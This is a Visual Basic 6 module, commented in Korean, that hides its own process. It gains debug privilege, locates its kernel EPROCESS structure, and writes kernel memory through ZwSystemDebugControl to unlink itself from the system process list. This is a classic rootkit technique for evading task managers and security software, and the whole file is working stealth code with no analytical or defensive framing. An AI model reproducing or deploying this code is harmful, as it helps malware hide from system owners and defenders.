Attribute VB_Name = "modHide"
Private Declare Function GetCurrentProcessId Lib "kernel32.dll" () As Long
Private Declare Function ZwSystemDebugControl Lib "ntdll" (ByVal ControlCode As Long, ByRef InputBuffer As Any, ByVal InputBufferLength As Long, ByRef OutputBuffer As Any, ByVal OutputBufferLength As Long, ByRef ReturnLength As Long) As Long
Private Declare Sub RtlMoveMemory Lib "kernel32.dll" (ByRef Destination As Any, ByRef Source As Any, ByVal Length As Long)
Private Declare Function DuplicateHandle Lib "kernel32.dll" (ByVal hSourceProcessHandle As Long, ByVal hSourceHandle As Long, ByVal hTargetProcessHandle As Long, ByRef lpTargetHandle As Long, ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwOptions As Long) As Long
Private Declare Function CloseHandle Lib "kernel32.dll" (ByVal hObject As Long) As Long
Private Declare Function ZwQuerySystemInformation Lib "ntdll.dll" (ByVal SystemInformationClass As Long, ByRef SystemInformation As Any, ByVal SystemInformationLength As Long, ByRef ReturnLength As Long) As Long
Private Declare Function RtlAdjustPrivilege Lib "ntdll.dll" (ByVal Privilege As Long, ByVal bEnablePrivilege As Long, ByVal IsThreadPrivilege As Long, ByRef PreviousValue As Long) As Long
Private Const STATUS_INFO_LENGTH_MISMATCH& = &HC0000004
Private Const DUPLICATE_SAME_ACCESS& = 2&
Private Const NtCurrentProcess& = &HFFFFFFFF
Private Const SeDebugPrivilege& = 20&

Private Type SYSTEM_HANDLE_TABLE_ENTRY_INFO
    UniqueProcessId As Integer
    CreatorBackTraceIndex As Integer
    ObjectTypeIndex As Byte
    HandleAttributes As Byte
    HandleValue As Integer
    Object As Long
    GrantedAccess As Long
End Type

Private Type MEMORY_CHUNKS
    VirtualAddress As Long
    Buffer As Long
    Length As Long
End Type

Private Enum SYSTEM_INFORMATION_CLASS
    SystemBasicInformation = 0&
    SystemProcessorInformation
    SystemPerformanceInformation
    SystemTimeOfDayInformation
    SystemNotImplemented1
    SystemProcessesAndThreadsInformation
    SystemCallCounts
    SystemConfigurationInformation
    SystemProcessorTimes
    SystemGlobalFlag
    SystemNotImplemented2
    SystemModuleInformatio
    SystemLockInformation
    SystemNotImplemented3
    SystemNotImplemented4
    SystemNotImplemented5
    SystemHandleInformation
    SystemObjectInformation
    SystemPagefileInformation
    SystemInstructionEmulationCounts
    SystemInvalidInfoClass1
    SystemCacheInformation
    SystemPoolTagInformation
    SystemProcessorStatistics
    SystemDpcInformation
    SystemNotImplemented6
    SystemLoadImage
    SystemUnloadImage
    SystemTimeAdjustment
    SystemNotImplemented7
    SystemNotImplemented8
    SystemNotImplemented9
    SystemCrashDumpInformation
    SystemExceptionInformation
    SystemCrashDumpStateInformation
    SystemKernelDebuggerInformation
    SystemContextSwitchInformation
    SystemRegistryQuotaInformation
    SystemLoadAndCallImage
    SystemPrioritySeparation
    SystemNotImplemented10
    SystemNotImplemented11
    SystemInvalidInfoClass2
    SystemInvalidInfoClass3
    SystemTimeZoneInformation
    SystemLookasideInformation
    SystemSetTimeSlipEvent
    SystemCreateSession
    SystemDeleteSession
    SystemInvalidInfoClass4
    SystemRangeStartInformation
    SystemVerifierInformation
    SystemAddVerifier
    SystemSessionProcessesInformation
End Enum

Private Enum DEBUG_CONTROL_CODE
    SysDbgGetTraceInformation = 1
    SysDbgSetInternalBreakpoint = 2
    SysDbgSetSpecialCall = 3
    SysDbgClearSpecialCalls = 4
    SysDbgQuerySpecialCalls = 5
    ' Addition NT 5.1(WXP) or later
    SysDbgDbgBreakPointWithStatus = 6
    SysDbgSysGetVersion = 7
    SysDbgCopyMemoryChunks_0 = 8
    SysDbgReadVirtualMemory = 8
    SysDbgCopyMemoryChunks_1 = 9
    SysDbgWriteVirtualMemory = 9
    SysDbgCopyMemoryChunks_2 = 10
    SysDbgReadPhysicalAddr = 10
    SysDbgCopyMemoryChunks_3 = 11
    SysDbgWritePhysicalAddr = 11
    SysDbgSysReadControlSpace = 12
    SysDbgSysWriteControlSpace = 13
    SysDbgSysReadIoSpace = 14
    SysDbgSysWriteIoSpace = 15
    SysDbgSysReadMsr = 16
    SysDbgSysWriteMsr = 17
    SysDbgSysReadBusData = 18
    SysDbgSysWriteBusData = 19
    SysDbgSysCheckLowMemory = 20
    ' Addition NT 5.2(Win2003) or later
    SysDbgEnableDebugger = 21
    SysDbgDisableDebugger = 22
    SysDbgGetAutoEnableOnEvent = 23
    SysDbgSetAutoEnableOnEvent = 24
    SysDbgGetPitchDebugger = 25
    SysDbgSetDbgPrintBufferSize = 26
    SysDbgGetIgnoreUmExceptions = 27
    SysDbgSetIgnoreUmExceptions = 28
End Enum

Public Function GainDebugPrivilege(Optional ByRef refErrorCode As Long = 0&) As Boolean

    refErrorCode = RtlAdjustPrivilege(SeDebugPrivilege, 1&, 0&, 0&)
    GainDebugPrivilege = refErrorCode >= 0&

End Function

Function GetCurrentEPROCESSPtr() As Long
    Dim hProcess As Long, CurrentPID As Long, Buffer() As Byte, lRet As Long, lNeededLen As Long, Entries As Long, Entry As SYSTEM_HANDLE_TABLE_ENTRY_INFO, CurEntry As Long
    CurrentPID = GetCurrentProcessId()
    DuplicateHandle NtCurrentProcess, NtCurrentProcess, NtCurrentProcess, hProcess, 0, 0, DUPLICATE_SAME_ACCESS
    If hProcess = 0& Then Exit Function
    ReDim Buffer(255)
    lRet = ZwQuerySystemInformation(SystemHandleInformation, Buffer(0), 256, lNeededLen)
    If lRet = STATUS_INFO_LENGTH_MISMATCH Then
        ReDim Buffer(lNeededLen - 1)
        lRet = ZwQuerySystemInformation(SystemHandleInformation, Buffer(0), lNeededLen, lNeededLen)
        If lRet Then
            MsgBox "ZwQuerySystemInformation (SystemHandleInformation) 실패! (NTSTATUS: " & Hex(lRet) & ")", vbCritical Or vbSystemModal, "오류"
            CloseHandle hProcess
            Exit Function
        End If
    ElseIf lRet Then
        MsgBox "ZwQuerySystemInformation (SystemHandleInformation) 실패! (NTSTATUS: " & Hex(lRet) & ")", vbCritical Or vbSystemModal, "오류"
        CloseHandle hProcess
        Exit Function
    End If
    RtlMoveMemory Entries, Buffer(0), 4
    For CurEntry = 0 To Entries - 1
        RtlMoveMemory Entry, Buffer(CurEntry * Len(Entry) + 4), Len(Entry)
        If Entry.UniqueProcessId = CurrentPID And _
           Entry.HandleValue = hProcess Then
            GetCurrentEPROCESSPtr = Entry.Object
            Exit For
        End If
    Next
    CloseHandle hProcess
End Function

Public Sub HideMyProcess()
    Const FLINKOFFSET& = &H88& ' 시스템 마다 틀립니다.
    Const BLINKOFFSET& = FLINKOFFSET + 4&
    Const SeDebugPrivilege& = 20&
    Dim pProcess As Long, memChunk As MEMORY_CHUNKS, Flink As Long, Blink As Long
    RtlAdjustPrivilege SeDebugPrivilege, 1, 0, 0&
    pProcess = GetCurrentEPROCESSPtr
    With memChunk
        .VirtualAddress = pProcess + FLINKOFFSET
        .Length = 4&
        .Buffer = VarPtr(Flink)
    End With
    ZwSystemDebugControl SysDbgReadVirtualMemory, memChunk, Len(memChunk), ByVal 0&, 0, 0&
    With memChunk
        .VirtualAddress = pProcess + BLINKOFFSET
        .Length = 4&
        .Buffer = VarPtr(Blink)
    End With
    ZwSystemDebugControl SysDbgReadVirtualMemory, memChunk, Len(memChunk), ByVal 0&, 0, 0&
    If Flink Then
        ' 앞 프로세스에서 현재 프로세스에 대한 링크를 끊는다.
        With memChunk
            .VirtualAddress = Flink - FLINKOFFSET + BLINKOFFSET
            .Length = 4&
            .Buffer = VarPtr(Blink)
        End With
        ZwSystemDebugControl SysDbgWriteVirtualMemory, memChunk, Len(memChunk), ByVal 0&, 0, 0&
    End If
    If Blink Then
        ' 뒤 프로세스에서 현재 프로세스에 대한 링크를 끊는다.
        With memChunk
            .VirtualAddress = Blink ' - FLINKOFFSET + FLINKOFFSET
            .Length = 4&
            .Buffer = VarPtr(Flink)
        End With
        ZwSystemDebugControl SysDbgWriteVirtualMemory, memChunk, Len(memChunk), ByVal 0&, 0, 0&
    End If

    ' ### 중요한 부분!! 블루스크린을 방지하기 위해서 추가한 코드
    With memChunk
        .VirtualAddress = pProcess + FLINKOFFSET
        .Length = 4&
        .Buffer = VarPtr(pProcess)
    End With
    ZwSystemDebugControl SysDbgWriteVirtualMemory, memChunk, Len(memChunk), ByVal 0&, 0, 0&
    With memChunk
        .VirtualAddress = pProcess + BLINKOFFSET
        .Length = 4&
        .Buffer = VarPtr(pProcess)
    End With
    ZwSystemDebugControl SysDbgWriteVirtualMemory, memChunk, Len(memChunk), ByVal 0&, 0, 0&
End Sub



